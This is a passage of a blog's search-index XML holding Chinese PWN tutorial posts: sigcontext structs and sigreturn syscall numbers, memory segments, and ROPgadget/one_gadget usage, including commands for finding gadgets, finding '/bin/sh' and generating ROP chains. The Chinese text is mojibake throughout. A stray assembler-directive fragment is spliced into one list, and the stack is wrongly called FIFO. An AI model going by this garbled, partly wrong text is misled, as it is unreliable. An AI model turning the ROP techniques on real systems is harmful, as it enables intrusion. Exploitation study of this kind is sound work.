class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><ul><li>x64<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//x64</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>signal handler è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å…¶ä¸­ï¼Œ32 ä½çš„ sigreturn çš„è°ƒç”¨å·ä¸º 119(0x77)ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15(0xf)ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ“ä½œç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-bssæ®µã€dataæ®µã€textæ®µã€å †(heap)å’Œæ ˆ(stack)</title>
      <link href="/2025/02/08/PWN%E5%9F%BA%E7%A1%80-bss%E6%AE%B5%E3%80%81data%E6%AE%B5%E3%80%81text%E6%AE%B5%E3%80%81%E5%A0%86-heap-%E5%92%8C%E6%A0%88-stack/"/>
      <url>/2025/02/08/PWN%E5%9F%BA%E7%A1%80-bss%E6%AE%B5%E3%80%81data%E6%AE%B5%E3%80%81text%E6%AE%B5%E3%80%81%E5%A0%86-heap-%E5%92%8C%E6%A0%88-stack/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><h2 id="bssæ®µ"><a href="#bssæ®µ" class="headerlink" title="bssæ®µ"></a>bssæ®µ</h2><p>bssæ®µï¼ˆbss segmentï¼‰é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­<strong>æœªåˆå§‹åŒ–</strong>çš„å…¨å±€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚<br>bssæ®µå±äºé™æ€å†…å­˜åˆ†é…ã€‚</p><h2 id="dataæ®µ"><a href="#dataæ®µ" class="headerlink" title="dataæ®µ"></a>dataæ®µ</h2><p>æ•°æ®æ®µï¼ˆdata segmentï¼‰é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­<strong>å·²åˆå§‹åŒ–</strong>çš„å…¨å±€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚<br>æ•°æ®æ®µå±äºé™æ€å†…å­˜åˆ†é…ã€‚</p><h2 id="textæ®µ"><a href="#textæ®µ" class="headerlink" title="textæ®µ"></a>textæ®µ</h2><p>ä»£ç æ®µï¼ˆcode segment/text segmentï¼‰é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºæ‰§è¡Œä»£ç çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚<br>è¿™éƒ¨åˆ†åŒºåŸŸçš„å¤§å°åœ¨ç¨‹åºè¿è¡Œå‰å°±å·²ç»ç¡®å®šï¼Œå¹¶ä¸”å†…å­˜åŒºåŸŸé€šå¸¸å±äºåªè¯»(æŸäº›æ¶æ„ä¹Ÿå…è®¸ä»£ç æ®µä¸ºå¯å†™ï¼Œå³å…è®¸ä¿®æ”¹ç¨‹åº)ã€‚<br>åœ¨ä»£ç æ®µä¸­ï¼Œä¹Ÿæœ‰å¯èƒ½åŒ…å«ä¸€äº›åªè¯»çš„å¸¸æ•°å˜é‡ï¼Œä¾‹å¦‚å­—ç¬¦ä¸²å¸¸é‡ç­‰ã€‚</p><h2 id="å †-heap"><a href="#å †-heap" class="headerlink" title="å †(heap)"></a>å †(heap)</h2><p>å †æ˜¯ç”¨äºå­˜æ”¾è¿›ç¨‹è¿è¡Œä¸­è¢«åŠ¨æ€åˆ†é…çš„å†…å­˜æ®µï¼Œå®ƒçš„å¤§å°å¹¶ä¸å›ºå®šï¼Œå¯åŠ¨æ€æ‰©å¼ æˆ–ç¼©å‡ã€‚<br>å½“è¿›ç¨‹è°ƒç”¨<strong>malloc</strong>ç­‰å‡½æ•°åˆ†é…å†…å­˜æ—¶ï¼Œæ–°åˆ†é…çš„å†…å­˜å°±è¢«åŠ¨æ€æ·»åŠ åˆ°å †ä¸Šï¼ˆå †è¢«æ‰©å¼ ï¼‰ï¼›<br>å½“åˆ©ç”¨<strong>free</strong>ç­‰å‡½æ•°é‡Šæ”¾å†…å­˜æ—¶ï¼Œè¢«é‡Šæ”¾çš„å†…å­˜ä»å †ä¸­è¢«å‰”é™¤ï¼ˆå †è¢«ç¼©å‡ï¼‰ã€‚</p><h2 id="æ ˆ-stack"><a href="#æ ˆ-stack" class="headerlink" title="æ ˆ(stack)"></a>æ ˆ(stack)</h2><p><strong>æ ˆåˆç§°å †æ ˆ</strong>ï¼Œæ˜¯ç”¨æˆ·å­˜æ”¾ç¨‹åº<strong>ä¸´æ—¶åˆ›å»ºçš„å±€éƒ¨å˜é‡</strong>ï¼Œ<br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å‡½æ•°æ‹¬å¼§â€œ{}â€ä¸­å®šä¹‰çš„å˜é‡ï¼ˆä½†<strong>ä¸åŒ…æ‹¬staticå£°æ˜çš„å˜é‡</strong>ï¼Œstaticæ„å‘³ç€åœ¨æ•°æ®æ®µä¸­å­˜æ”¾å˜é‡ï¼‰ã€‚<br>é™¤æ­¤ä»¥å¤–ï¼Œåœ¨å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå…¶å‚æ•°ä¹Ÿä¼šè¢«å‹å…¥å‘èµ·è°ƒç”¨çš„è¿›ç¨‹æ ˆä¸­ï¼Œå¹¶ä¸”å¾…åˆ°è°ƒç”¨ç»“æŸåï¼Œå‡½æ•°çš„è¿”å›å€¼ä¹Ÿä¼šè¢«å­˜æ”¾å›æ ˆä¸­ã€‚<br>ç”±äºæ ˆçš„<strong>å…ˆè¿›å…ˆå‡º(FIFO)ç‰¹ç‚¹ï¼Œæ‰€ä»¥æ ˆç‰¹åˆ«æ–¹ä¾¿ç”¨æ¥ä¿å­˜/æ¢å¤è°ƒç”¨ç°åœºã€‚</strong></p><p><strong>ä»è¿™ä¸ªæ„ä¹‰ä¸Šè®²ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå †æ ˆçœ‹æˆä¸€ä¸ªå¯„å­˜ã€äº¤æ¢ä¸´æ—¶æ•°æ®çš„å†…å­˜åŒºã€‚</strong></p><h1 id="å…¶ä»–çŸ¥è¯†"><a href="#å…¶ä»–çŸ¥è¯†" class="headerlink" title="å…¶ä»–çŸ¥è¯†"></a>å…¶ä»–çŸ¥è¯†</h1><ul><li>å…¨å±€çš„æœªåˆå§‹åŒ–å˜é‡å­˜åœ¨äº.bssæ®µä¸­ï¼Œå…·ä½“ä½“ç°ä¸ºä¸€ä¸ªå ä½ç¬¦ï¼›</li><li>xxxxxxxxxx7 1        ã€€ã€€DW      å®šä¹‰å­—(2å­—èŠ‚).  2        PROC    å®šä¹‰è¿‡ç¨‹.  3        ENDP    è¿‡ç¨‹ç»“æŸ.  4        SEGMENT å®šä¹‰æ®µ.  5        ASSUME  å»ºç«‹æ®µå¯„å­˜å™¨å¯»å€.  6        ENDS    æ®µç»“æŸ.  7        END    ç¨‹åºç»“æŸ.C</li><li>å‡½æ•°å†…çš„è‡ªåŠ¨å˜é‡éƒ½åœ¨æ ˆä¸Šåˆ†é…ç©ºé—´ï¼›</li><li>.bssæ˜¯ä¸å ç”¨.exeæ–‡ä»¶ç©ºé—´çš„ï¼Œå…¶å†…å®¹ç”±æ“ä½œç³»ç»Ÿåˆå§‹åŒ–ï¼ˆæ¸…é›¶ï¼‰ï¼›</li><li>.dataå´éœ€è¦å ç”¨ï¼Œå…¶å†…å®¹ç”±ç¨‹åºåˆå§‹åŒ–ã€‚å› æ­¤é€ æˆäº†ä¸Šè¿°æƒ…å†µã€‚</li><li>bssæ®µï¼ˆæœªæ‰‹åŠ¨åˆå§‹åŒ–çš„æ•°æ®ï¼‰å¹¶ä¸ç»™è¯¥æ®µçš„æ•°æ®åˆ†é…ç©ºé—´ï¼Œåªæ˜¯è®°å½•æ•°æ®æ‰€éœ€ç©ºé—´çš„å¤§å°ï¼›</li><li>bssæ®µçš„å¤§å°ä»å¯æ‰§è¡Œæ–‡ä»¶ä¸­å¾—åˆ° ï¼Œç„¶åé“¾æ¥å™¨å¾—åˆ°è¿™ä¸ªå¤§å°çš„å†…å­˜å—ï¼Œç´§è·Ÿåœ¨æ•°æ®æ®µåé¢ã€‚</li><li>dataæ®µï¼ˆå·²æ‰‹åŠ¨åˆå§‹åŒ–çš„æ•°æ®ï¼‰åˆ™ä¸ºæ•°æ®åˆ†é…ç©ºé—´ï¼Œæ•°æ®ä¿å­˜åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ï¼›</li><li>dataæ®µåŒ…å«ç»è¿‡åˆå§‹åŒ–çš„å…¨å±€å˜é‡ä»¥åŠå®ƒä»¬çš„å€¼ã€‚å½“è¿™ä¸ªå†…å­˜åŒºè¿›å…¥ç¨‹åºçš„åœ°å€ç©ºé—´åå…¨éƒ¨æ¸…é›¶ã€‚<br><strong>åŒ…å«dataæ®µå’Œbssæ®µçš„æ•´ä¸ªåŒºæ®µæ­¤æ—¶é€šå¸¸ç§°ä¸ºæ•°æ®åŒºã€‚</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·ROPgadgets_and_One-gadget_RCE</title>
      <link href="/2025/02/08/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7ROPgadgets-and-One-gadget-RCE/"/>
      <url>/2025/02/08/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7ROPgadgets-and-One-gadget-RCE/</url>
      
        <content type="html"><![CDATA[<p>ROPgadgetæ˜¯ä¸€ç§åŸºäºä»£ç å¤ç”¨æŠ€æœ¯çš„æ”»å‡»å·¥å…·ï¼Œå®ƒå¯ä»¥å¸®åŠ©æ”»å‡»è€…åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°å¯åˆ©ç”¨çš„ä»£ç ç‰‡æ®µï¼ˆå³ROPé“¾ä¸­çš„gadgetsï¼‰ï¼Œä»è€Œæ„å»ºå‡ºæœ‰æ•ˆçš„æ”»å‡»è½½è·ã€‚ä»¥ä¸‹æ˜¯ROPgadgetçš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼š</p><h2 id="æŸ¥æ‰¾gadgets"><a href="#æŸ¥æ‰¾gadgets" class="headerlink" title="æŸ¥æ‰¾gadgets"></a>æŸ¥æ‰¾gadgets</h2><p>ä½¿ç”¨ROPgadgetçš„åŸºæœ¬å‘½ä»¤æ ¼å¼æ˜¯ï¼š<br><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ROPgadget <span class="literal">--binary</span> &lt;æ–‡ä»¶å&gt; <span class="literal">--only</span> &lt;gadgetsç±»å‹&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>å…¶ä¸­ï¼Œ&lt;æ–‡ä»¶å&gt;æ˜¯ä½ æƒ³è¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„ï¼Œ<gadgetsç±»å‹>æ˜¯ä½ æƒ³è¦æŸ¥æ‰¾çš„gadgetsçš„ç±»å‹ï¼Œæ¯”å¦‚â€œpop|retâ€è¡¨ç¤ºæŸ¥æ‰¾æ‰€æœ‰åŒ…å«popå’ŒretæŒ‡ä»¤çš„gadgetsã€‚</gadgetsç±»å‹></p><h4 id="å¸¸ç”¨"><a href="#å¸¸ç”¨" class="headerlink" title="å¸¸ç”¨"></a>å¸¸ç”¨</h4><p><code>ROPgadget --binary example --string &quot;/bin/sh&quot;</code><br><code>ROPgadget --binary example --only &quot;int&quot;</code><br>ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³åœ¨åä¸ºexampleçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾æ‰€æœ‰çš„popå’Œret gadgetsï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š<br><code>ROPgadget --binary example --only &quot;pop|ret&quot;</code><br>jmpå’Œret<br><code>ROPgadget --binary b0verfl0w --only &quot;jmp|ret&quot;</code>ROPgadget â€”binary libc.so.6 â€”only â€œpop|retâ€ |grep â€œraxâ€<code>&quot;rax&quot;&quot;rdx&quot;&quot;rdi&quot;&quot;rcx&quot;&quot;rsi&quot;</code>one_gadget /path/to/binary`<br>ROPgadgetä¼šè¾“å‡ºæ‰€æœ‰åŒ¹é…çš„gadgetsä»¥åŠå®ƒä»¬åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„åç§»åœ°å€ã€‚ </p><h2 id="åˆ†ægadgets"><a href="#åˆ†ægadgets" class="headerlink" title="åˆ†ægadgets"></a>åˆ†ægadgets</h2><p>æŸ¥çœ‹ROPgadgetçš„è¾“å‡ºï¼Œåˆ†æå“ªäº›gadgetså¯ä»¥è¢«ç”¨æ¥æ„å»ºROPé“¾ã€‚ä½ éœ€è¦æ‰¾åˆ°ä¸€ç³»åˆ—çš„gadgetsï¼Œå®ƒä»¬èƒ½å¤ŸæŒ‰é¡ºåºæ‰§è¡Œä½ æƒ³è¦çš„æ“ä½œï¼Œæ¯”å¦‚æ”¹å˜å¯„å­˜å™¨çš„å€¼ã€è°ƒç”¨ç³»ç»Ÿå‡½æ•°ç­‰ã€‚</p><h2 id="æ„å»ºROPé“¾ï¼š"><a href="#æ„å»ºROPé“¾ï¼š" class="headerlink" title="æ„å»ºROPé“¾ï¼š"></a>æ„å»ºROPé“¾ï¼š</h2><p>æ ¹æ®åˆ†æçš„ç»“æœï¼Œæ‰‹åŠ¨æˆ–ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ„å»ºROPé“¾ã€‚ROPé“¾æ˜¯ä¸€ç³»åˆ—gadgetsçš„åºåˆ—ï¼Œå½“å®ƒä»¬è¢«è¿ç»­æ‰§è¡Œæ—¶ï¼Œèƒ½å¤Ÿå®Œæˆæ”»å‡»è€…çš„ç›®æ ‡ï¼Œæ¯”å¦‚æ‰§è¡Œä»»æ„ä»£ç æˆ–è·å–shellã€‚</p><h2 id="æµ‹è¯•ROPé“¾ï¼š"><a href="#æµ‹è¯•ROPé“¾ï¼š" class="headerlink" title="æµ‹è¯•ROPé“¾ï¼š"></a>æµ‹è¯•ROPé“¾ï¼š</h2><p>åœ¨å—æ§çš„ç¯å¢ƒä¸­æµ‹è¯•æ„å»ºçš„ROPé“¾ï¼Œç¡®ä¿å®ƒèƒ½å¤ŸæŒ‰ç…§é¢„æœŸå·¥ä½œã€‚è¿™é€šå¸¸æ¶‰åŠåˆ°åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè§¦å‘æ¼æ´å¹¶åˆ©ç”¨ROPé“¾æ‰§è¡Œæ”»å‡»ã€‚</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ROPgadget çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼š</span><br><span class="line">ç”¨æ³•ï¼šROPgadget [-<span class="type">h</span>] [-<span class="type">v</span>] [-<span class="type">c</span>] [--<span class="type">binary</span> &lt;<span class="type">binary</span>&gt;] [--<span class="type">opcode</span> &lt;<span class="type">opcodes</span>&gt;]</span><br><span class="line">[--<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;] [--<span class="type">memstr</span> &lt;<span class="built_in">string</span>&gt;] [--<span class="type">depth</span> &lt;<span class="type">nbyte</span>&gt;] [--<span class="type">only</span> &lt;<span class="type">key</span>&gt;]</span><br><span class="line">[--<span class="type">filter</span> &lt;<span class="type">key</span>&gt;] [--<span class="type">range</span> &lt;<span class="built_in">start-end</span>&gt;] [--<span class="type">badbytes</span> &lt;<span class="built_in">byte</span>&gt;]</span><br><span class="line">[--<span class="type">rawArch</span> &lt;<span class="type">arch</span>&gt;] [--<span class="type">rawMode</span> &lt;<span class="type">mode</span>&gt;] [--<span class="type">rawEndian</span> &lt;<span class="type">endian</span>&gt;] [--<span class="type">re</span> &lt;<span class="type">re</span>&gt;]</span><br><span class="line">[--<span class="type">offset</span> &lt;<span class="type">hexaddr</span>&gt;] [--<span class="type">ropchain</span>] [--<span class="type">thumb</span>] [--<span class="type">console</span>] [--<span class="type">norop</span>]</span><br><span class="line">[--<span class="type">nojop</span>] [--<span class="type">callPreceded</span>] [--<span class="type">nosys</span>] [--<span class="type">multibr</span>] [--<span class="type">all</span>] [--<span class="type">noinstr</span>]</span><br><span class="line">[--<span class="type">dump</span>] [--<span class="type">silent</span>] [--<span class="type">align</span> <span class="type">ALIGN</span>] [--<span class="type">mipsrop</span> &lt;<span class="type">rtype</span>&gt;]</span><br><span class="line">é€‰é¡¹ç¿»è¯‘ï¼š</span><br><span class="line"> </span><br><span class="line">    <span class="literal">-h</span>, <span class="literal">--help</span>ï¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡ºã€‚</span><br><span class="line">    <span class="literal">-v</span>, <span class="literal">--version</span>ï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡ºã€‚</span><br><span class="line">    <span class="literal">-c</span>, <span class="literal">--color</span>ï¼šè¾“å‡ºå½©è‰²ç»“æœï¼ˆéœ€è¦ç»ˆç«¯æ”¯æŒï¼‰ã€‚</span><br><span class="line">    <span class="literal">--binary</span> &lt;binary&gt;ï¼šæŒ‡å®šè¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</span><br><span class="line">    <span class="literal">--opcode</span> &lt;opcodes&gt;ï¼šæœç´¢åŒ…å«æŒ‡å®šæŒ‡ä»¤çš„ gadgetsã€‚</span><br><span class="line">    <span class="literal">--string</span> &lt;string&gt;ï¼šæœç´¢åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„ gadgetsã€‚</span><br><span class="line">    <span class="literal">--memstr</span> &lt;string&gt;ï¼šæœç´¢åœ¨å†…å­˜ä¸­æ‰¾åˆ°æŒ‡å®šå­—ç¬¦ä¸²çš„ gadgetsã€‚</span><br><span class="line">    <span class="literal">--depth</span> &lt;nbyte&gt;ï¼šæœç´¢æŒ‡å®šæ·±åº¦çš„ gadgetsã€‚</span><br><span class="line">    <span class="literal">--only</span> &lt;key&gt;ï¼šä»…æ˜¾ç¤ºåŒ…å«æŒ‡å®šå…³é”®å­—çš„ gadgetsã€‚</span><br><span class="line">    <span class="literal">--filter</span> &lt;key&gt;ï¼šæ’é™¤åŒ…å«æŒ‡å®šå…³é”®å­—çš„ gadgetsã€‚</span><br><span class="line">    <span class="literal">--range</span> &lt;<span class="built_in">start-end</span>&gt;ï¼šåœ¨æŒ‡å®šåœ°å€èŒƒå›´å†…æœç´¢ gadgetsã€‚</span><br><span class="line">    <span class="literal">--badbytes</span> &lt;byte&gt;ï¼šæ’é™¤åŒ…å«æŒ‡å®šå­—èŠ‚çš„ gadgetsã€‚</span><br><span class="line">    <span class="literal">--rawArch</span> &lt;arch&gt;ï¼šæŒ‡å®šåŸå§‹æ¶æ„ï¼ˆä¾‹å¦‚ x86, amd64, arm ç­‰ï¼‰ã€‚</span><br><span class="line">    <span class="literal">--rawMode</span> &lt;mode&gt;ï¼šæŒ‡å®šåŸå§‹æ¨¡å¼ï¼ˆä¾‹å¦‚ <span class="number">32</span> æˆ– <span class="number">64</span> ä½ï¼‰ã€‚</span><br><span class="line">    <span class="literal">--rawEndian</span> &lt;endian&gt;ï¼šæŒ‡å®šåŸå§‹å­—èŠ‚åºï¼ˆä¾‹å¦‚ little æˆ– bigï¼‰ã€‚</span><br><span class="line">    <span class="literal">--re</span> &lt;re&gt;ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢ gadgetsã€‚</span><br><span class="line">    <span class="literal">--offset</span> &lt;hexaddr&gt;ï¼šæ˜¾ç¤ºç»™å®šåç§»åœ°å€é™„è¿‘çš„ gadgetsã€‚</span><br><span class="line">    <span class="literal">--ropchain</span>ï¼šä¸ºæ‰¾åˆ°çš„ gadgets ç”Ÿæˆä¸€ä¸ª ROP é“¾ã€‚</span><br><span class="line">    <span class="literal">--thumb</span>ï¼šé’ˆå¯¹ ARM Thumb æŒ‡ä»¤é›†æœç´¢ gadgetsã€‚</span><br><span class="line">    <span class="literal">--console</span>ï¼šå°†è¾“å‡ºå‘é€åˆ°æ§åˆ¶å°ï¼ˆåœ¨ <span class="literal">--ropchain</span> æ¨¡å¼ä¸‹æœ‰ç”¨ï¼‰ã€‚</span><br><span class="line">    <span class="literal">--norop</span>ï¼šä¸æ˜¾ç¤º ROP gadgetsã€‚</span><br><span class="line">    <span class="literal">--nojop</span>ï¼šä¸æ˜¾ç¤º JOP gadgetsã€‚</span><br><span class="line">    <span class="literal">--callPreceded</span>ï¼šä»…æ˜¾ç¤ºè¢«è°ƒç”¨æŒ‡ä»¤å‰é¢çš„ gadgetsã€‚</span><br><span class="line">    <span class="literal">--nosys</span>ï¼šä¸æ˜¾ç¤ºç³»ç»Ÿè°ƒç”¨ gadgetsã€‚</span><br><span class="line">    <span class="literal">--multibr</span>ï¼šæ˜¾ç¤ºå¤šä¸ªåˆ†æ”¯çš„ gadgetsã€‚</span><br><span class="line">    <span class="literal">--all</span>ï¼šæ˜¾ç¤ºæ‰€æœ‰ gadgetsï¼Œæ— è¿‡æ»¤ã€‚</span><br><span class="line">    <span class="literal">--noinstr</span>ï¼šä¸æ˜¾ç¤ºæŒ‡ä»¤ï¼Œåªæ˜¾ç¤ºåç§»ã€‚</span><br><span class="line">    <span class="literal">--dump</span>ï¼šè¾“å‡º gadgets çš„åŸå§‹å­—èŠ‚ã€‚</span><br><span class="line">    <span class="literal">--silent</span>ï¼šä¸æ˜¾ç¤ºä»»ä½•è­¦å‘Šæˆ–ä¿¡æ¯ã€‚</span><br><span class="line">    <span class="literal">--align</span> ALIGNï¼šå¯¹ gadgets åç§»è¿›è¡Œå¯¹é½ã€‚</span><br><span class="line">    <span class="literal">--mipsrop</span> &lt;rtype&gt;ï¼šé’ˆå¯¹ MIPS æ¶æ„ï¼ŒæŒ‡å®š ROP ç±»å‹ï¼ˆä¾‹å¦‚ rop, jop, rop_nopï¼‰ã€‚</span><br><span class="line"> </span><br><span class="line">è¿™äº›é€‰é¡¹å¯ä»¥å¸®åŠ©ä½ æ ¹æ®ç‰¹å®šéœ€æ±‚å®šåˆ¶ ROPgadget çš„æœç´¢å’Œåˆ†æè¿‡ç¨‹ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨ <span class="literal">--opcode</span> æ¥æœç´¢åŒ…å«ç‰¹å®šæŒ‡ä»¤åºåˆ—çš„ gadgetsï¼Œæˆ–è€…ä½¿ç”¨ <span class="literal">--range</span> æ¥é™åˆ¶æœç´¢çš„åœ°å€èŒƒå›´ã€‚ä½ è¿˜å¯ä»¥ä½¿ç”¨ <span class="literal">--ropchain</span> æ¥è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŸºäºæ‰¾åˆ°çš„ gadgets çš„ ROP é“¾ï¼Œè¿™å¯¹äºå¿«é€Ÿæ„å»ºæ”»å‡»è½½è·éå¸¸æœ‰ç”¨ã€‚</span><br><span class="line"> </span><br><span class="line">è¿™äº›ä¾‹å­å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ROPgadgetçš„ä¸åŒé€‰é¡¹æ¥æ‰§è¡Œç‰¹å®šçš„æœç´¢å’Œåˆ†æä»»åŠ¡ã€‚ä¸‹é¢æ˜¯æ¯ä¸ªä¾‹å­åŠå…¶ç”¨é€”çš„ä¸­æ–‡è§£é‡Šï¼š</span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤å¯¹æŒ‡å®šçš„x86 Linux ELFäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡ŒROP gadgetsæœç´¢ã€‚</span><br><span class="line"><span class="literal">---------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--ropchain</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤é™¤äº†æœç´¢ROP gadgetsä¹‹å¤–ï¼Œè¿˜è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªROPé“¾ã€‚</span><br><span class="line"> <span class="literal">--------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--depth</span> <span class="number">3</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤æœç´¢æ·±åº¦ä¸º<span class="number">3</span>çš„ROP gadgetsï¼Œå³åªæœç´¢åŒ…å«<span class="number">3</span>ä¸ªæˆ–æ›´å°‘æŒ‡ä»¤çš„gadgetsã€‚</span><br><span class="line"><span class="literal">---------------</span></span><br><span class="line">ROPgadget.py <span class="literal">--binary</span> ./<span class="built_in">test-suite</span><span class="literal">-binaries</span>/elf<span class="literal">-Linux-x86</span> <span class="literal">--string</span> <span class="string">&quot;main&quot;</span></span><br><span class="line">è¿™ä¸ªå‘½ä»¤æœç´¢åŒ…å«å­—ç¬¦ä¸²<span class="string">&quot;main&quot;</span>çš„ROP gadgetsã€‚</span><br><span class="line"><span 